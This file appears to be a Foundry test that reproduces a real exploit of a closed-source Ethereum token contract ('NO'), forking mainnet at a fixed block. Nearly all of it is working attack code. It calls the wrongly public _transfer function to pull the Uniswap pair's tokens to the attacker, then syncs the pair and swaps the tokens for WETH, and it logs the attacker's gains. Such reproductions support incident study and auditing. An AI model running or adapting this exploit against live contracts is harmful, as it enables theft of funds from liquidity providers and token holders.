// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~2K USD$
// Vulnerable Contract : https://etherscan.io/address/0x6feac5f3792065b21f85bc118d891b33e0673bd8

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6feac5f3792065b21f85bc118d891b33e0673bd8#code

// @Analysis
// https://twitter.com/hexagate_/status/1663501545105702912 (second tx)
// Vulnerability: Closed source contract. Probable vulnerabilities: Wrong function (_transfer) visibility / Non standard ERC20 implementation

interface INO {
    function _transfer(address sender, address recipient, uint256 amount) external;

    function transfer(address to, uint256 value) external;

    function balanceOf(address account) external returns (uint256);
}

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    INO NO = INO(0x6fEAc5F3792065b21f85BC118D891b33e0673bD8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x421A5671306CB5f66FF580573C1c8D536E266c93);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public constant flashbotsBuilder = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_366_979);
        cheats.label(address(NO), "NO");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(Router), "Router");
    }

    function testTransfer() public {
        emit log_named_decimal_uint(
            "Attacker amount of WETH before exploitation of vulnerability",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
        // Vulnerable point. Looks like this function has wrong visibility. This shouldn't be public
        NO._transfer(address(Pair), address(this), NO.balanceOf(address(Pair)) - 1);

        Pair.sync();
        // This transfer function seems to be not compatible with IERC20. Custom implementation
        NO.transfer(address(Pair), NO.balanceOf(address(this)));

        (uint256 NOReserve, uint256 WETHReserve,) = Pair.getReserves();

        flashbotsBuilder.call{value: 0.000000001 ether}("");

        uint256 amount1Out = Router.getAmountOut(NO.balanceOf(address(Pair)) - 1, NOReserve, WETHReserve);

        Pair.swap(0, amount1Out, address(this), "");

        emit log_named_decimal_uint(
            "Attacker amount of WETH after exploitation of vulnerability",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
    }
}
